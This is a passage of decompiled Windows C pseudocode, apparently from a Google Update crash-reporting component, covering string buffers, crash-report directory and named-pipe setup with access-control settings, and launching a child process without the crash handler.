    if (pcVar5 < param_3 + ((int)pcVar1 - (int)*param_1)) {
      pcVar5 = param_3 + ((int)pcVar1 - (int)*param_1);
    }
    _Dst = std::_Allocate_char_((unsigned_int)pcVar5,(char *)0x0);
    FID_conflict__memcpy(_Dst,*param_1,(int)param_1[1] - (int)*param_1);
    pcVar1 = param_1[1];
    pcVar2 = *param_1;
    if (*param_1 != (char *)0x0) {
      FID_conflict__free(*param_1);
    }
    *param_1 = _Dst;
    param_1[2] = _Dst + (int)pcVar5;
    param_1[1] = _Dst + ((int)pcVar1 - (int)pcVar2);
  }
  return;
}



void ** __fastcall
FUN_00410e9b(void **param_1,uint param_2,undefined4 *param_3,uint param_4,uint param_5)

{
  code *pcVar1;
  uint uVar2;
  void **ppvVar3;
  void *extraout_ECX;
  void *pvVar4;
  uint extraout_EDX;
  char *unaff_EDI;
  
  if ((uint)param_3[4] < param_4) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EDI);
    pvVar4 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  else {
    uVar2 = param_3[4] - param_4;
    if (uVar2 < param_5) {
      param_5 = uVar2;
    }
    pvVar4 = param_1[4];
    if (param_5 < -(int)pvVar4 - 1U) {
      if (param_5 != 0) {
        pvVar4 = (void *)((int)pvVar4 + param_5);
        uVar2 = FUN_0040aff3(param_1,param_2,pvVar4,'\0');
        if ((char)uVar2 != '\0') {
          if (7 < (uint)param_3[5]) {
            param_3 = (undefined4 *)*param_3;
          }
          ppvVar3 = param_1;
          if (&DAT_00000008 <= param_1[5]) {
            ppvVar3 = (void **)*param_1;
          }
          copy((void *)((int)ppvVar3 + (int)param_1[4] * 2),(void *)((int)param_3 + param_4 * 2),
               param_5);
          param_1[4] = pvVar4;
          ppvVar3 = param_1;
          if (&DAT_00000008 <= param_1[5]) {
            ppvVar3 = (void **)*param_1;
          }
          *(undefined2 *)((int)ppvVar3 + (int)pvVar4 * 2) = 0;
        }
      }
      return param_1;
    }
  }
  FUN_00422ea9(pvVar4,(short)param_2);
  pcVar1 = (code *)swi(3);
  ppvVar3 = (void **)(*pcVar1)();
  return ppvVar3;
}



void FUN_00410f40(int *param_1,int *param_2)

{
  code *pcVar1;
  int **ppiVar2;
  undefined8 uVar3;
  undefined4 uVar4;
  
  uVar4 = 0x128;
  uVar3 = FUN_00416f82(0x128);
  ppiVar2 = (int **)uVar3;
  if (ppiVar2 == (int **)0x0) {
    FUN_00422e78(uVar4,(int)((ulonglong)uVar3 >> 0x20));
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  if (param_1 == (int *)0x0) {
    param_1 = (int *)ppiVar2;
    param_2 = (int *)ppiVar2;
  }
  *ppiVar2 = param_1;
  if (ppiVar2 + 1 != (int **)0x0) {
    ppiVar2[1] = param_2;
  }
  return;
}



void ** __fastcall FUN_00410f77(void **param_1,undefined4 *param_2)

{
  int iVar1;
  void *pvVar2;
  void *pvVar3;
  uint uVar4;
  void **ppvVar5;
  uint uVar6;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  uint extraout_EDX;
  undefined8 uVar7;
  
  param_1[4] = (void *)0x0;
  param_1[5] = (void *)0x7;
  *(undefined2 *)param_1 = 0;
  iVar1 = param_2[4];
  uVar7 = FUN_0041c12a(param_1,(short)param_2);
  uVar6 = (uint)((ulonglong)uVar7 >> 0x20);
  pvVar3 = (void *)((int)uVar7 + iVar1);
  pvVar2 = param_1[4];
  if (((pvVar2 <= pvVar3) && (param_1[5] != pvVar3)) &&
     (uVar4 = FUN_0040aff3(param_1,uVar6,pvVar3,'\x01'), uVar6 = extraout_EDX, (char)uVar4 != '\0'))
  {
    param_1[4] = pvVar2;
    ppvVar5 = param_1;
    if (&DAT_00000008 <= param_1[5]) {
      ppvVar5 = (void **)*param_1;
    }
    *(undefined2 *)((int)ppvVar5 + (int)pvVar2 * 2) = 0;
  }
  FUN_00410e9b(param_1,uVar6,param_2,0,0xffffffff);
  uVar6 = FUN_0041c12a(extraout_ECX,extraout_DX);
  FUN_00410d65(param_1,(undefined4 *)&DAT_0042f0d4,uVar6);
  return param_1;
}



// Library Function - Single Match
//  _wmemset
// 
// Library: Visual Studio

wchar_t * __cdecl _wmemset(wchar_t *_S,wchar_t _C,size_t _N)

{
  uint uVar1;
  undefined4 *puVar2;
  
  if (_N != 0) {
    puVar2 = (undefined4 *)_S;
    for (uVar1 = _N >> 1; uVar1 != 0; uVar1 = uVar1 - 1) {
      *puVar2 = CONCAT22(_C,_C);
      puVar2 = puVar2 + 1;
    }
    for (uVar1 = (uint)((_N & 1) != 0); uVar1 != 0; uVar1 = uVar1 - 1) {
      *(wchar_t *)puVar2 = _C;
      puVar2 = (undefined4 *)((int)puVar2 + 2);
    }
  }
  return _S;
}



int __fastcall FUN_0041101e(undefined4 param_1)

{
  int iVar1;
  char cVar2;
  int iVar3;
  int local_54;
  int local_50;
  
  FUN_0041319f(&local_54,param_1,param_1,(char)param_1);
  cVar2 = (**(code **)(local_54 + 4))();
  if (cVar2 == '\0') {
    iVar3 = -0x7ffbf27f;
  }
  else {
    for (iVar3 = *(int *)(local_50 + 4); iVar3 != 0; iVar3 = *(int *)(iVar3 + 0xc)) {
      iVar1 = *(int *)(iVar3 + 8);
      if (iVar1 == 1) {
        (**(code **)(local_54 + 0x18))(iVar3);
      }
      else if (iVar1 == 2) {
        (**(code **)(local_54 + 0x14))(iVar3);
      }
      else if (iVar1 == 3) {
        (**(code **)(local_54 + 0x10))(iVar3);
      }
      else if (iVar1 == 4) {
        (**(code **)(local_54 + 0xc))(iVar3);
      }
    }
    (**(code **)(local_54 + 8))();
  }
  FUN_00413221(&local_54);
  return iVar3;
}



uint __fastcall FUN_004110a8(int param_1,byte param_2)

{
  int iVar1;
  uint uVar2;
  ushort extraout_DX;
  LPCWSTR local_1c;
  _SECURITY_ATTRIBUTES local_18;
  
  FUN_00401e5a(&local_1c);
  FUN_004022ce((int)L"{C68009EA-1163-4498-8E93-D5C4E317D8CE}",extraout_DX & 0xff00 | (ushort)param_2
               ,&local_1c);
  iVar1 = FUN_004069a2(local_1c,&local_18);
  *(int *)(param_1 + 4) = iVar1;
  uVar2 = FUN_00401e83((int *)&local_1c);
  return uVar2 & 0xffffff00 | (uint)(iVar1 != 0);
}



int __cdecl FUN_004110f0(byte param_1)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  uint extraout_ECX;
  undefined **local_10;
  undefined4 local_c;
  
  FUN_00411d09();
  uVar1 = FUN_00411ec0(param_1);
  if ((char)uVar1 == '\0') {
    iVar2 = 0;
  }
  else {
    local_c = 0;
    local_10 = &PTR_FUN_0042fad8;
    uVar3 = FUN_004110a8((int)&local_10,param_1);
    if ((char)uVar3 == '\0') {
      iVar2 = -0x7ffbf280;
    }
    else {
      (*(code *)local_10[1])();
      iVar2 = FUN_0041101e(extraout_ECX & 0xffffff00 | (uint)param_1);
      (*(code *)local_10[2])();
    }
    FUN_00406a0c(&local_10);
  }
  return iVar2;
}



void __fastcall FUN_00411163(HKEY *param_1)

{
  if (*param_1 != (HKEY)0x0) {
    RegCloseKey(*param_1);
    *param_1 = (HKEY)0x0;
  }
  param_1[1] = (HKEY)0x0;
  return;
}



undefined8 __fastcall FUN_0041117d(int *param_1)

{
  bool bVar1;
  bool bVar2;
  uint uVar3;
  PACL pDacl;
  LPWSTR pObjectName;
  int extraout_EDX;
  undefined8 uVar4;
  SE_OBJECT_TYPE ObjectType;
  SECURITY_INFORMATION SecurityInfo;
  PSID psidOwner;
  PSID psidGroup;
  PACL pSacl;
  int local_154 [8];
  undefined4 local_134;
  char local_12d;
  undefined4 local_12c [24];
  undefined4 local_cc [24];
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_134 = 0;
  FUN_004049e3(local_154);
  FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
  uVar3 = FUN_0040442b(local_154,local_6c,0x10000000,3);
  bVar1 = false;
  bVar2 = false;
  if ((char)uVar3 != '\0') {
    FUN_004041f2(local_cc,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
    uVar3 = FUN_0040442b(local_154,local_cc,0x10000000,3);
    bVar1 = false;
    bVar2 = true;
    if ((char)uVar3 != '\0') {
      bVar2 = true;
      bVar1 = true;
      FUN_004041f2(local_12c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
      uVar3 = FUN_0040442b(local_154,local_12c,0x20000,3);
      local_12d = '\0';
      if ((char)uVar3 != '\0') goto LAB_0041125f;
    }
  }
  local_12d = '\x01';
LAB_0041125f:
  if (bVar1) {
    FUN_00404961(local_12c);
  }
  if (bVar2) {
    FUN_00404961(local_cc);
  }
  FUN_00404961(local_6c);
  if (local_12d == '\0') {
    pSacl = (PACL)0x0;
    pDacl = (PACL)FUN_00403fc6(local_154);
    psidGroup = (PSID)0x0;
    psidOwner = (PSID)0x0;
    SecurityInfo = 0x80000004;
    ObjectType = SE_FILE_OBJECT;
    pObjectName = (LPWSTR)FUN_00407b2e(param_1);
    SetNamedSecurityInfoW(pObjectName,ObjectType,SecurityInfo,psidOwner,psidGroup,pDacl,pSacl);
    ReleaseBuffer(param_1,extraout_EDX,-1);
  }
  FUN_004044af(local_154);
  uVar4 = FUN_0041a954();
  return uVar4;
}



undefined4 __fastcall FUN_00411304(char param_1,void *param_2)

{
  int *piVar1;
  LPCWSTR *ppWVar2;
  int **ppiVar3;
  int **ppiVar4;
  undefined4 uVar5;
  undefined8 uVar6;
  LPCWSTR pWVar7;
  char cVar8;
  int local_10;
  int **local_c;
  char local_5;
  
  uVar5 = 0;
  local_10 = 0;
  local_5 = param_1;
  FUN_00411d09();
  if (param_1 == '\0') {
    piVar1 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_10,piVar1);
    piVar1 = &local_10;
    cVar8 = '\x01';
    ppWVar2 = (LPCWSTR *)FUN_00404cfa(&local_c,(HMODULE)L"Google\\CrashReports");
    pWVar7 = (LPCWSTR)0x1c;
  }
  else {
    piVar1 = (int *)FUN_0040139e();
    CSimpleStringT__(&local_10,piVar1);
    piVar1 = &local_10;
    cVar8 = '\x01';
    ppWVar2 = (LPCWSTR *)FUN_00404cfa(&local_c,(HMODULE)L"Google\\CrashReports");
    pWVar7 = (LPCWSTR)0x26;
  }
  FUN_00411c69(pWVar7,ppWVar2,cVar8,piVar1);
  FUN_00401df0(local_c + -4);
  ppiVar3 = FUN_00401aca((int **)(local_10 + -0x10));
  ppiVar4 = ppiVar3 + 4;
  local_c = ppiVar4;
  if (param_1 == '\0') {
    FUN_00401df0((int **)(local_10 + -0x10));
  }
  else {
    FUN_00401df0((int **)(local_10 + -0x10));
  }
  if (local_5 == '\0') {
LAB_004113dc:
    if (ppiVar4[-3] == (int *)0x0) goto LAB_004113e1;
  }
  else {
    if (ppiVar3[1] != (int *)0x0) {
      uVar6 = FUN_0041117d((int *)&local_c);
      ppiVar4 = local_c;
      if ((int)uVar6 < 0) {
        RemoveDirectoryW((LPCWSTR)local_c);
      }
      goto LAB_004113dc;
    }
LAB_004113e1:
    piVar1 = FUN_00404ea6(&local_10);
    FUN_00401b2a(&local_c,piVar1);
    FUN_00401df0((int **)(local_10 + -0x10));
    ppiVar4 = local_c;
    if (local_c[-3] == (int *)0x0) {
      uVar5 = 0x8004fffc;
      goto LAB_0041141e;
    }
  }
  if (param_2 != (void *)0x0) {
    FUN_00401b2a(param_2,(int *)&local_c);
  }
LAB_0041141e:
  FUN_00401df0(ppiVar4 + -4);
  return uVar5;
}



int __fastcall FUN_0041142f(void *param_1)

{
  int *piVar1;
  void *this;
  int iVar2;
  undefined8 uVar3;
  void *local_18;
  uint local_14;
  undefined4 local_10;
  undefined4 local_c;
  int local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  uVar3 = FUN_00407c57(&local_8);
  iVar2 = (int)uVar3;
  if (iVar2 < 0) {
    this = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (this != (void *)0x0) {
      local_18 = this;
      local_14 = FUN_00405bda(this,this,-2);
      local_10 = 0xfffffffe;
      local_c = 8;
      FUN_00401e16(&local_18,L"[GetCrashPipeName][GetProcessUser failed][0x%08x]");
    }
  }
  else {
    FUN_00404d7b(param_1,(short)((ulonglong)uVar3 >> 0x20),(int)L"\\\\.\\pipe\\GoogleCrashServices")
    ;
    FUN_0040814b(param_1,0x125c);
    iVar2 = 0;
  }
  FUN_00401df0((int **)(local_8 + -0x10));
  return iVar2;
}



undefined8 __fastcall FUN_004114ca(char param_1,void *param_2)

{
  char cVar1;
  uint uVar2;
  void *pvVar3;
  undefined8 uVar4;
  int local_ac [8];
  undefined **local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  void *local_7c;
  uint local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_8c = &PTR_FUN_0042f0f4;
  local_88 = 0;
  local_84 = 0;
  local_80 = 0;
  cVar1 = FUN_004080ed(&local_8c);
  if (cVar1 == '\0') {
    FUN_00407e13();
    pvVar3 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (pvVar3 != (void *)0x0) {
      local_7c = pvVar3;
      local_78 = FUN_00405bda(pvVar3,pvVar3,-2);
      local_74 = 0xfffffffe;
      local_70 = 8;
      FUN_00401e16(&local_7c,L"[Failed to get current thread token][0x%08x]");
    }
    goto LAB_004116b6;
  }
  FUN_004049e3(local_ac);
  uVar4 = FUN_004037ca(&local_8c,local_ac);
  if ((char)uVar4 == '\0') {
    FUN_00407e13();
    pvVar3 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (pvVar3 != (void *)0x0) {
      local_7c = pvVar3;
      local_78 = FUN_00405bda(pvVar3,pvVar3,-2);
      local_74 = 0xfffffffe;
      local_70 = 8;
      FUN_00401e16(&local_7c,L"[Failed to get default DACL][0x%08x]");
    }
  }
  else if (param_1 == '\0') {
LAB_0041169c:
    FUN_0040409f(param_2,local_ac);
  }
  else {
    FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,2);
    uVar2 = FUN_0040442b(local_ac,local_6c,0x100183,0);
    FUN_00404961(local_6c);
    if ((char)uVar2 != '\0') {
      FUN_004041f2(local_6c,(PSID_IDENTIFIER_AUTHORITY)&DAT_0042da6c,1);
      uVar2 = FUN_00411be5(local_ac,local_6c);
      FUN_00404961(local_6c);
      if ((char)uVar2 != '\0') goto LAB_0041169c;
    }
    pvVar3 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (pvVar3 != (void *)0x0) {
      local_7c = pvVar3;
      local_78 = FUN_00405bda(pvVar3,pvVar3,-2);
      local_74 = 0xfffffffe;
      local_70 = 8;
      FUN_00401e16(&local_7c,L"[Failed to setup pipe security]");
    }
  }
  FUN_004044af(local_ac);
LAB_004116b6:
  local_8c = &PTR_FUN_0042f0f4;
  FUN_00403d60((int)&local_8c);
  uVar4 = FUN_0041a954();
  return uVar4;
}



DWORD __fastcall FUN_004116de(undefined4 param_1,void *param_2)

{
  DWORD DVar1;
  undefined8 uVar2;
  wchar_t *pwVar3;
  void *local_14;
  uint local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  DVar1 = FUN_0040849c(param_1,param_2);
  if ((int)DVar1 < 0) {
    local_14 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (local_14 == (void *)0x0) {
      return DVar1;
    }
    local_10 = FUN_00405bda(local_14,local_14,-2);
    pwVar3 = L"[Failed to set low integrity SACL][%#x]";
  }
  else {
    uVar2 = FUN_004114ca((char)param_1,param_2);
    DVar1 = (DWORD)uVar2;
    if (-1 < (int)DVar1) {
      return 0;
    }
    local_14 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
    if (local_14 == (void *)0x0) {
      return DVar1;
    }
    local_10 = FUN_00405bda(local_14,local_14,-2);
    pwVar3 = L"[Failed to add pipe security DACL][%#x]";
  }
  local_c = 0xfffffffe;
  local_8 = 8;
  FUN_00401e16(&local_14,pwVar3);
  return DVar1;
}



undefined4 __fastcall FUN_00411779(HMODULE *param_1,void *param_2)

{
  int *piVar1;
  HMODULE *local_8;
  
  local_8 = param_1;
  piVar1 = FUN_00408761(&local_8,param_1);
  FUN_00401b2a(param_2,piVar1);
  FUN_00401df0((int **)(local_8 + -4));
  FUN_0040814b(param_2,0x13f8);
  return 0;
}



DWORD __fastcall FUN_004117b1(void *param_1,int **param_2)

{
  DWORD DVar1;
  void *local_8;
  
  local_8 = param_1;
  FUN_00404cfa(&local_8,(HMODULE)L"ClientCustomData");
  DVar1 = FUN_00412663(param_1,param_2);
  FUN_00401df0((int **)((int)local_8 + -0x10));
  if (-1 < (int)DVar1) {
    DVar1 = 0;
  }
  return DVar1;
}



DWORD FUN_004117f1(void)

{
  LPWCH pWVar1;
  LPWSTR lpCommandLine;
  void *pvVar2;
  undefined2 extraout_DX;
  DWORD DVar3;
  LPSECURITY_ATTRIBUTES lpProcessAttributes;
  LPSECURITY_ATTRIBUTES lpThreadAttributes;
  BOOL BVar4;
  DWORD dwCreationFlags;
  void *lpEnvironment;
  LPCWSTR lpCurrentDirectory;
  _STARTUPINFOW *lpStartupInfo;
  _PROCESS_INFORMATION *lpProcessInformation;
  _STARTUPINFOW local_84;
  _PROCESS_INFORMATION local_38;
  void *local_28;
  void *local_24;
  void *local_20;
  undefined4 local_1c;
  int **local_18 [2];
  int *local_10;
  int local_c;
  int *local_8;
  
  pvVar2 = (void *)(-(uint)(DAT_00437b68 != '\0') & 0x437e20);
  if (pvVar2 != (void *)0x0) {
    local_28 = pvVar2;
    local_24 = (void *)FUN_00405bda(pvVar2,pvVar2,-1);
    local_20 = (void *)0xffffffff;
    local_1c = 8;
    FUN_00401e16(&local_28,L"[StartProcessWithNoExceptionHandler][%s]");
  }
  FUN_00408871((int *)local_18);
  FUN_00404cfa(&local_c,(HMODULE)&DAT_00431130);
  FUN_00404cfa(&local_8,(HMODULE)L"GOOGLE_UPDATE_NO_CRASH_HANDLER");
  FUN_0040ec13(local_18,&local_8,&local_c);
  FUN_00401df0((int **)(local_8 + -4));
  FUN_00401df0((int **)(local_c + -0x10));
  DVar3 = 0;
  local_20 = (void *)0x0;
  local_24 = (void *)0x0;
  local_1c = 0;
  pWVar1 = GetEnvironmentStringsW();
  pvVar2 = (void *)0x0;
  if (pWVar1 != (LPWCH)0x0) {
    FUN_0040ec6e((int **)local_18,extraout_DX,pWVar1,&local_24);
    FreeEnvironmentStringsW(pWVar1);
    pvVar2 = local_24;
    if (local_24 != local_20) {
      local_84.cb = 0x44;
      FUN_00416e80((uint *)&local_84.lpReserved,0,0x40);
      pvVar2 = local_24;
      local_38.hProcess = (HANDLE)0x0;
      local_38.hThread = (HANDLE)0x0;
      local_38.dwProcessId = 0;
      local_38.dwThreadId = 0;
      lpProcessInformation = &local_38;
      lpStartupInfo = &local_84;
      lpCurrentDirectory = (LPCWSTR)0x0;
      dwCreationFlags = 0x400;
      BVar4 = 0;
      lpThreadAttributes = (LPSECURITY_ATTRIBUTES)0x0;
      lpProcessAttributes = (LPSECURITY_ATTRIBUTES)0x0;
      lpEnvironment = local_24;
      lpCommandLine = (LPWSTR)FUN_00407b2e(local_10);
      BVar4 = CreateProcessW((LPCWSTR)0x0,lpCommandLine,lpProcessAttributes,lpThreadAttributes,BVar4
                             ,dwCreationFlags,lpEnvironment,lpCurrentDirectory,lpStartupInfo,
                             lpProcessInformation);
      if (BVar4 != 0) {
        CloseHandle(local_38.hProcess);
        CloseHandle(local_38.hThread);
        goto LAB_00411922;
      }
    }
  }
  DVar3 = FUN_00407e13();
LAB_00411922:
  if (pvVar2 != (void *)0x0) {
    FID_conflict__free(pvVar2);
  }
  FUN_0040b05c(local_18,(int *)&local_10,(int **)*local_18[0],local_18[0]);
  FID_conflict__free(local_18[0]);
  return DVar3;
}



DWORD __fastcall FUN_00411951(undefined4 param_1,char param_2,int *param_3,int *param_4)

{
  int *piVar1;
  int **ppiVar2;
  int *piVar3;
  DWORD DVar4;
  undefined4 local_44;
  undefined local_40;
  char local_3f;
  undefined local_2c [4];
  undefined local_28 [28];
  int local_c;
  int **local_8;
  
  FUN_00413752(&local_44);
  local_40 = (undefined)param_1;
  local_3f = param_2;
  FUN_00401b2a(local_2c,param_3);
  if ((param_4 != (int *)0x0) && (*(int *)(*param_4 + -0xc) != 0)) {
    FUN_00401b2a(local_28,param_4);
  }
  FUN_004125c4(&param_4,param_2);
  piVar1 = param_4;
  local_8 = FUN_00401aca((int **)(param_4 + -4));
  local_8 = local_8 + 4;
  FUN_004087b2((int *)&local_8);
  piVar3 = (int *)FUN_0040139e();
  CSimpleStringT__(&param_4,piVar3);
  FUN_0041387a(&local_44,&local_c);
  ppiVar2 = local_8;
  FUN_00408121((int *)&param_4,0x1bb8);
  FUN_00401df0((int **)(local_c + -0x10));
  FUN_00401df0(ppiVar2 + -4);
  DVar4 = FUN_004117f1();
  FUN_00401df0((int **)(param_4 + -4));
  FUN_00401df0((int **)(piVar1 + -4));
  FUN_00413803((int)&local_44);
  return DVar4;
}



undefined4 __fastcall FUN_00411a25(int *param_1,int **param_2)

{
  int *piVar1;
  int iVar2;
  int **ppiVar3;
  byte extraout_CL;
  byte extraout_CL_00;
  int extraout_EDX;
  int extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint uVar4;
  undefined4 uVar5;
  int iVar6;
  int *local_20;
  int **local_1c;
  int local_18;
  int local_14;
  uint local_10;
  int local_c;
  int *local_8;
  
  local_1c = param_2;
  FUN_00408850((int *)param_2);
  if ((param_1[1] == 0) || (uVar5 = 0, *param_1 == 0)) {
    uVar5 = 0;
  }
  else {
    local_10 = 0;
    if (param_1[1] != 0) {
      local_14 = 0;
      do {
        iVar6 = *param_1 + local_14;
        piVar1 = (int *)FUN_0040139e();
        CSimpleStringT__(&local_8,piVar1);
        piVar1 = (int *)FUN_0040139e();
        CSimpleStringT__(&local_c,piVar1);
        iVar2 = FUN_0041cc9c(extraout_CL,extraout_EDX);
        FUN_00401d64(&local_8,iVar6,iVar2);
        local_18 = FUN_0041cc9c(extraout_CL_00,extraout_EDX_00);
        FUN_00401d64(&local_c,iVar6 + 0x80,local_18);
        ppiVar3 = local_1c;
        if ((iVar2 == 0x40) || (local_18 == 0x40)) {
          uVar5 = 1;
        }
        FUN_0040ae86((int *)local_1c,extraout_EDX_01,(int *)&local_20,(int *)&local_8);
        uVar4 = extraout_EDX_02;
        if (local_20 != *ppiVar3) {
          FUN_00407c33(&local_8,extraout_EDX_02,local_20[4]);
          uVar4 = extraout_EDX_03;
        }
        piVar1 = &local_c;
        ppiVar3 = FUN_00411b8d(ppiVar3,uVar4,&local_8);
        FUN_00401b2a(ppiVar3,piVar1);
        FUN_00401df0((int **)(local_c + -0x10));
        FUN_00401df0((int **)(local_8 + -4));
        local_10 = local_10 + 1;
        local_14 = local_14 + 0x100;
      } while (local_10 < (uint)param_1[1]);
    }
  }
  return uVar5;
}



uint __fastcall FUN_00411b3d(int **param_1)

{
  int iVar1;
  int **ppiVar2;
  int **local_8;
  
  ppiVar2 = (int **)*param_1;
  local_8 = (int **)*ppiVar2;
  if (local_8 != ppiVar2) {
    do {
      ppiVar2 = local_8;
      iVar1 = FUN_00402858(local_8 + 4,L"deferred-upload");
      if ((iVar1 == 0) && (iVar1 = FUN_00402858(ppiVar2 + 5,L"true"), iVar1 == 0)) {
        return 1;
      }
      ppiVar2 = FUN_00402ad4((int **)&local_8);
    } while (local_8 != (int **)*param_1);
  }
  return (uint)ppiVar2 & 0xffffff00;
}



int ** __fastcall FUN_00411b8d(int **param_1,uint param_2,int **param_3)

{
  int **ppiVar1;
  int iVar2;
  int **ppiVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar4;
  uint extraout_EDX;
  uint extraout_EDX_00;
  
  ppiVar3 = param_3;
  FUN_0040ae86((int *)param_1,param_2,(int *)&param_3,(int *)param_3);
  ppiVar1 = param_3;
  uVar4 = extraout_ECX;
  if (param_3 != (int **)*param_1) {
    iVar2 = FUN_00407c33(ppiVar3,extraout_EDX,(int)param_3[4]);
    uVar4 = extraout_ECX_00;
    param_3 = ppiVar1;
    if (-1 < iVar2) goto LAB_00411bdb;
  }
  param_3 = ppiVar3;
  ppiVar3 = (int **)FUN_0040f0d1(param_1,uVar4,(int **)&param_3);
  FUN_0040b5d5(param_1,extraout_EDX_00,(int **)&param_3,ppiVar1,(int *)(ppiVar3 + 4),ppiVar3);
LAB_00411bdb:
  return param_3 + 5;
}



uint __thiscall FUN_00411be5(void *this,undefined4 *param_1)

{
  code *pcVar1;
  uint uVar2;
  void *this_00;
  
  uVar2 = FUN_004042dd((int)param_1);
  if ((char)uVar2 != '\0') {
    if (*(char *)((int)this + 8) != '\0') {
                    // WARNING: Load size is inaccurate
      (**(code **)(*this + 8))();
      *(undefined *)((int)this + 8) = 0;
    }
    this_00 = (void *)FUN_00416f82(0x74);
    if (this_00 == (void *)0x0) {
      param_1 = (undefined4 *)0x0;
    }
    else {
      param_1 = FUN_004043ac(this_00,(int)param_1,0x1f01ff,0,0);
    }
    if (param_1 == (undefined4 *)0x0) {
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar1 = (code *)swi(3);
      uVar2 = (*pcVar1)();
      return uVar2;
    }
    uVar2 = FUN_004043e6((void *)((int)this + 0x10),&param_1);
    FID_conflict__free(*(void **)((int)this + 4));
    *(undefined4 *)((int)this + 4) = 0;
    if (param_1 != (undefined4 *)0x0) {
      uVar2 = (**(code **)*param_1)(1);
    }
    uVar2 = CONCAT31((int3)(uVar2 >> 8),1);
  }
  return uVar2;
}



int __fastcall FUN_00411c69(LPCWSTR param_1,LPCWSTR *param_2,char param_3,void *param_4)

{
  LPCWSTR pMore;
  int *piVar1;
  BOOL BVar2;
  undefined2 extraout_DX;
  int extraout_EDX;
  LPCWSTR pWVar3;
  int iVar4;
  undefined8 uVar5;
  LPCWSTR local_8;
  
  local_8 = param_1;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar1);
  uVar5 = FUN_0040245f((uint)param_1 | 0x4000,(int *)&local_8);
  iVar4 = (int)uVar5;
  pWVar3 = local_8;
  if (-1 < iVar4) {
    pMore = *param_2;
    if ((int)(1U - *(int *)(local_8 + -2) | *(int *)(local_8 + -4) - 0x104U) < 0) {
      ATL::CSimpleStringT<char,0>::PrepareWrite2((CSimpleStringT_char_0_ *)&local_8,0x104);
    }
    pWVar3 = local_8;
    BVar2 = PathAppendW(local_8,pMore);
    ReleaseBuffer((int *)&local_8,extraout_EDX,-1);
    if (BVar2 == 0) {
      iVar4 = -0x7ffbf8f7;
    }
    else {
      FUN_00404d7b(param_4,extraout_DX,(int)pWVar3);
      if (param_3 != '\0') {
        FUN_0040233f(pWVar3);
      }
      iVar4 = 0;
    }
  }
  FUN_00401df0((int **)(pWVar3 + -8));
  return iVar4;
}



char * FUN_00411d09(void)

{
  char *pcVar1;
  int iVar2;
  
  (**(code **)(DAT_00437f68 + 4))();
  if (DAT_00437b9c == (char *)0x0) {
    iVar2 = FUN_00416f82(2);
    if (iVar2 == 0) {
      DAT_00437b9c = (char *)0x0;
    }
    else {
      DAT_00437b9c = FUN_00411d53();
    }
  }
  pcVar1 = DAT_00437b9c;
  (**(code **)(DAT_00437f68 + 8))();
  return pcVar1;
}



char * FUN_00411d53(void)

{
  ushort *puVar1;
  char cVar2;
  HMODULE pHVar3;
  int *piVar4;
  LPCWSTR *ppWVar5;
  int iVar6;
  bool bVar7;
  ushort *local_14;
  int local_10;
  char *local_c;
  int local_8;
  
  pHVar3 = (HMODULE)FUN_00404da4();
  FUN_00404e28(&local_14,pHVar3);
  piVar4 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar4);
  piVar4 = &local_8;
  bVar7 = false;
  cVar2 = '\0';
  ppWVar5 = (LPCWSTR *)FUN_00404cfa(&local_10,(HMODULE)L"Google\\Update");
  iVar6 = FUN_00411c69((LPCWSTR)0x1c,ppWVar5,cVar2,piVar4);
  FUN_00401df0((int **)(local_10 + -0x10));
  puVar1 = local_14;
  if (iVar6 < 0) {
    cVar2 = '\0';
  }
  else {
    iVar6 = FUN_004079cf(local_8,local_14,*(int *)(local_8 + -0xc),'\x01');
    cVar2 = '\x01' - (iVar6 != 0);
  }
  *local_c = cVar2;
  piVar4 = &local_8;
  cVar2 = '\0';
  ppWVar5 = (LPCWSTR *)FUN_00404cfa(&local_14,(HMODULE)L"Google\\Update");
  iVar6 = FUN_00411c69((LPCWSTR)0x26,ppWVar5,cVar2,piVar4);
  FUN_00401df0((int **)(local_14 + -8));
  if (-1 < iVar6) {
    iVar6 = FUN_004079cf(local_8,puVar1,*(int *)(local_8 + -0xc),'\x01');
    bVar7 = iVar6 == 0;
  }
  local_c[1] = bVar7;
  FUN_00401df0((int **)(local_8 + -0x10));
  FUN_00401df0((int **)(puVar1 + -8));
  return local_c;
}



void * FUN_00411e38(void *param_1)

{
  int *piVar1;
  LPCWSTR *ppWVar2;
  char cVar3;
  void *pvVar4;
  int local_8;
  
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1,piVar1);
  cVar3 = '\x01';
  pvVar4 = param_1;
  ppWVar2 = (LPCWSTR *)FUN_00404cfa(&local_8,(HMODULE)L"Google\\Update");
